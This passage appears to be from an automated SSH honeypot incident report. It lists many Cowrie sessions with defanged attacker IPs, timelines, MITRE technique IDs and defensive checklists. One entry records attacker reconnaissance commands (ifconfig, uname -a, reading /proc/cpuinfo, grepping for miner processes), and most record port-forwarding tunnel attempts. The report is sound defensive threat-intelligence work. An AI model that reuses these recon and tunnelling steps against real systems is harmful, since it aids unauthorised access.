- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-013049256d52

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]119` |
| **First Seen** | 2026-08-05 15:49 |
| **Last Seen** | 2026-08-05 15:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:49:57` | `cowrie.session.connect` |
| `2026-08-05 15:49:57` | `cowrie.client.version` |
| `2026-08-05 15:49:57` | `cowrie.client.kex` |
| `2026-08-05 15:49:58` | `cowrie.login.success` |
| `2026-08-05 15:49:59` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]119` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47f7f9fb79bb

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-05 15:50 |
| **Last Seen** | 2026-08-05 15:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:50:04` | `cowrie.session.connect` |
| `2026-08-05 15:50:04` | `cowrie.client.version` |
| `2026-08-05 15:50:04` | `cowrie.client.kex` |
| `2026-08-05 15:50:05` | `cowrie.login.success` |
| `2026-08-05 15:50:05` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc46cdb6357

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]224` |
| **First Seen** | 2026-08-05 15:50 |
| **Last Seen** | 2026-08-05 15:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:50:50` | `cowrie.session.connect` |
| `2026-08-05 15:50:50` | `cowrie.client.version` |
| `2026-08-05 15:50:50` | `cowrie.client.kex` |
| `2026-08-05 15:50:51` | `cowrie.login.success` |
| `2026-08-05 15:50:51` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:50:51` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]224` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad20dd9c2fcd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 15:53 |
| **Last Seen** | 2026-08-05 15:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:53:52` | `cowrie.session.connect` |
| `2026-08-05 15:53:52` | `cowrie.client.version` |
| `2026-08-05 15:53:52` | `cowrie.client.kex` |
| `2026-08-05 15:53:53` | `cowrie.login.success` |
| `2026-08-05 15:53:53` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:53:53` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d30b3eeba0a8

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-08-05 15:56 |
| **Last Seen** | 2026-08-05 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:56:45` | `cowrie.session.connect` |
| `2026-08-05 15:56:45` | `cowrie.client.version` |
| `2026-08-05 15:56:45` | `cowrie.client.kex` |
| `2026-08-05 15:56:45` | `cowrie.login.success` |
| `2026-08-05 15:56:46` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:56:46` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2824f6018692

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 15:56 |
| **Last Seen** | 2026-08-05 15:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:56:51` | `cowrie.session.connect` |
| `2026-08-05 15:56:51` | `cowrie.client.version` |
| `2026-08-05 15:56:51` | `cowrie.client.kex` |
| `2026-08-05 15:56:52` | `cowrie.login.success` |
| `2026-08-05 15:56:52` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:56:52` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c65e1f61903d

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-08-05 15:58 |
| **Last Seen** | 2026-08-05 15:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:58:10` | `cowrie.session.connect` |
| `2026-08-05 15:58:10` | `cowrie.client.version` |
| `2026-08-05 15:58:10` | `cowrie.client.kex` |
| `2026-08-05 15:58:10` | `cowrie.login.success` |
| `2026-08-05 15:58:11` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:58:11` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:58:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b033b2fef0a2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-05 16:01 |
| **Last Seen** | 2026-08-05 16:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:01:24` | `cowrie.session.connect` |
| `2026-08-05 16:01:24` | `cowrie.client.version` |
| `2026-08-05 16:01:24` | `cowrie.client.kex` |
| `2026-08-05 16:01:24` | `cowrie.login.success` |
| `2026-08-05 16:01:25` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:01:25` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f96e0198039

| Field | Detail |
|---|---|
| **Source IP** | `103.158.138[.]179` |
| **First Seen** | 2026-08-05 16:05 |
| **Last Seen** | 2026-08-05 16:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:05:28` | `cowrie.session.connect` |
| `2026-08-05 16:05:29` | `cowrie.client.version` |
| `2026-08-05 16:05:29` | `cowrie.client.kex` |
| `2026-08-05 16:05:31` | `cowrie.login.success` |
| `2026-08-05 16:05:31` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.138[.]179` to AbuseIPDB if not already reported
- [ ] Block `103.158.138[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb491970c00b

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]224` |
| **First Seen** | 2026-08-05 16:17 |
| **Last Seen** | 2026-08-05 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:17:48` | `cowrie.session.connect` |
| `2026-08-05 16:17:48` | `cowrie.client.version` |
| `2026-08-05 16:17:48` | `cowrie.client.kex` |
| `2026-08-05 16:17:49` | `cowrie.login.success` |
| `2026-08-05 16:17:49` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:17:49` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]224` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e603235b70df

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 16:18 |
| **Last Seen** | 2026-08-05 16:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:18:35` | `cowrie.session.connect` |
| `2026-08-05 16:18:35` | `cowrie.client.version` |
| `2026-08-05 16:18:35` | `cowrie.client.kex` |
| `2026-08-05 16:18:35` | `cowrie.login.success` |
| `2026-08-05 16:18:35` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:18:36` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-091eebde07ed

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 16:19 |
| **Last Seen** | 2026-08-05 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:19:08` | `cowrie.session.connect` |
| `2026-08-05 16:19:08` | `cowrie.client.version` |
| `2026-08-05 16:19:08` | `cowrie.client.kex` |
| `2026-08-05 16:19:09` | `cowrie.login.success` |
| `2026-08-05 16:19:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b78775a417a7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 16:19 |
| **Last Seen** | 2026-08-05 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:19:09` | `cowrie.session.connect` |
| `2026-08-05 16:19:09` | `cowrie.client.version` |
| `2026-08-05 16:19:09` | `cowrie.client.kex` |
| `2026-08-05 16:19:09` | `cowrie.login.success` |
| `2026-08-05 16:19:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78f6f14dc7da

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 16:19 |
| **Last Seen** | 2026-08-05 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:19:12` | `cowrie.session.connect` |
| `2026-08-05 16:19:12` | `cowrie.client.version` |
| `2026-08-05 16:19:12` | `cowrie.client.kex` |
| `2026-08-05 16:19:12` | `cowrie.login.success` |
| `2026-08-05 16:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63a246f17279

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 16:19 |
| **Last Seen** | 2026-08-05 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:19:12` | `cowrie.session.connect` |
| `2026-08-05 16:19:12` | `cowrie.client.version` |
| `2026-08-05 16:19:12` | `cowrie.client.kex` |
| `2026-08-05 16:19:12` | `cowrie.login.success` |
| `2026-08-05 16:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6b0714ef326

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]165` |
| **First Seen** | 2026-08-05 16:23 |
| **Last Seen** | 2026-08-05 16:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:23:27` | `cowrie.session.connect` |
| `2026-08-05 16:23:27` | `cowrie.client.version` |
| `2026-08-05 16:23:27` | `cowrie.client.kex` |
| `2026-08-05 16:23:28` | `cowrie.login.success` |
| `2026-08-05 16:23:28` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:23:28` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:23:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]165` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c481985d639

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]21` |
| **First Seen** | 2026-08-05 16:23 |
| **Last Seen** | 2026-08-05 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:23:43` | `cowrie.session.connect` |
| `2026-08-05 16:23:43` | `cowrie.client.version` |
| `2026-08-05 16:23:43` | `cowrie.client.kex` |
| `2026-08-05 16:23:44` | `cowrie.login.success` |
| `2026-08-05 16:23:44` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:23:44` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:23:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]21` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-572c056dcf67

| Field | Detail |
|---|---|
| **Source IP** | `151.237.170[.]49` |
| **First Seen** | 2026-08-05 16:24 |
| **Last Seen** | 2026-08-05 16:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:24:50` | `cowrie.session.connect` |
| `2026-08-05 16:24:51` | `cowrie.client.version` |
| `2026-08-05 16:24:51` | `cowrie.client.kex` |
| `2026-08-05 16:24:52` | `cowrie.login.success` |
| `2026-08-05 16:24:53` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.237.170[.]49` to AbuseIPDB if not already reported
- [ ] Block `151.237.170[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-404aec22e718

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-05 16:27 |
| **Last Seen** | 2026-08-05 16:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:27:02` | `cowrie.session.connect` |
| `2026-08-05 16:27:02` | `cowrie.client.version` |
| `2026-08-05 16:27:02` | `cowrie.client.kex` |
| `2026-08-05 16:27:02` | `cowrie.login.success` |
| `2026-08-05 16:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e66c51d27b4d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-05 16:27 |
| **Last Seen** | 2026-08-05 16:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:27:02` | `cowrie.session.connect` |
| `2026-08-05 16:27:02` | `cowrie.client.version` |
| `2026-08-05 16:27:02` | `cowrie.client.kex` |
| `2026-08-05 16:27:02` | `cowrie.login.success` |
| `2026-08-05 16:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ba7f9414f7f

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-05 16:27 |
| **Last Seen** | 2026-08-05 16:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:27:06` | `cowrie.session.connect` |
| `2026-08-05 16:27:06` | `cowrie.client.version` |
| `2026-08-05 16:27:06` | `cowrie.client.kex` |
| `2026-08-05 16:27:07` | `cowrie.login.success` |
| `2026-08-05 16:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94889735689e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-05 16:27 |
| **Last Seen** | 2026-08-05 16:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:27:07` | `cowrie.session.connect` |
| `2026-08-05 16:27:07` | `cowrie.client.version` |
| `2026-08-05 16:27:07` | `cowrie.client.kex` |
| `2026-08-05 16:27:08` | `cowrie.login.success` |
| `2026-08-05 16:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1637039b6af3

| Field | Detail |
|---|---|
| **Source IP** | `38.148.20[.]90` |
| **First Seen** | 2026-08-05 16:28 |
| **Last Seen** | 2026-08-05 16:30 |
| **Session Duration** | 126s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:28:11` | `cowrie.session.connect` |
| `2026-08-05 16:28:11` | `cowrie.client.version` |
| `2026-08-05 16:28:11` | `cowrie.client.kex` |
| `2026-08-05 16:28:18` | `cowrie.login.failed` |
| `2026-08-05 16:28:19` | `cowrie.login.success` |
| `2026-08-05 16:28:19` | `cowrie.session.params` |
| `2026-08-05 16:28:19` | `cowrie.command.input` |
| `2026-08-05 16:28:19` | `cowrie.command.failed` |
| `2026-08-05 16:28:20` | `cowrie.log.closed` |
| `2026-08-05 16:28:20` | `cowrie.session.params` |
| `2026-08-05 16:28:20` | `cowrie.command.input` |
| `2026-08-05 16:28:20` | `cowrie.log.closed` |
| `2026-08-05 16:28:21` | `cowrie.session.params` |
| `2026-08-05 16:28:21` | `cowrie.command.input` |
| `2026-08-05 16:28:21` | `cowrie.log.closed` |
| `2026-08-05 16:28:22` | `cowrie.session.params` |
| `2026-08-05 16:28:22` | `cowrie.command.input` |
| `2026-08-05 16:28:22` | `cowrie.log.closed` |
| `2026-08-05 16:28:23` | `cowrie.session.params` |
| `2026-08-05 16:28:23` | `cowrie.command.input` |
| `2026-08-05 16:28:23` | `cowrie.log.closed` |
| `2026-08-05 16:28:24` | `cowrie.session.params` |
| `2026-08-05 16:28:24` | `cowrie.command.input` |
| `2026-08-05 16:28:24` | `cowrie.log.closed` |
| `2026-08-05 16:28:25` | `cowrie.session.params` |
| `2026-08-05 16:28:25` | `cowrie.command.input` |
| `2026-08-05 16:28:25` | `cowrie.log.closed` |
| `2026-08-05 16:28:25` | `cowrie.session.params` |
| `2026-08-05 16:28:25` | `cowrie.command.input` |
| `2026-08-05 16:28:26` | `cowrie.log.closed` |
| `2026-08-05 16:28:26` | `cowrie.session.params` |
| `2026-08-05 16:28:26` | `cowrie.command.input` |
| `2026-08-05 16:28:26` | `cowrie.log.closed` |
| `2026-08-05 16:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.20[.]90` to AbuseIPDB if not already reported
- [ ] Block `38.148.20[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f7d14d36bd

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-08-05 16:28 |
| **Last Seen** | 2026-08-05 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:28:42` | `cowrie.session.connect` |
| `2026-08-05 16:28:42` | `cowrie.client.version` |
| `2026-08-05 16:28:42` | `cowrie.client.kex` |
| `2026-08-05 16:28:43` | `cowrie.login.success` |
| `2026-08-05 16:28:43` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:28:43` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ffcd965c126

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 16:32 |
| **Last Seen** | 2026-08-05 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:32:19` | `cowrie.session.connect` |
| `2026-08-05 16:32:19` | `cowrie.client.version` |
| `2026-08-05 16:32:20` | `cowrie.client.kex` |
| `2026-08-05 16:32:20` | `cowrie.login.success` |
| `2026-08-05 16:32:20` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:32:20` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed12b0282db0

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]21` |
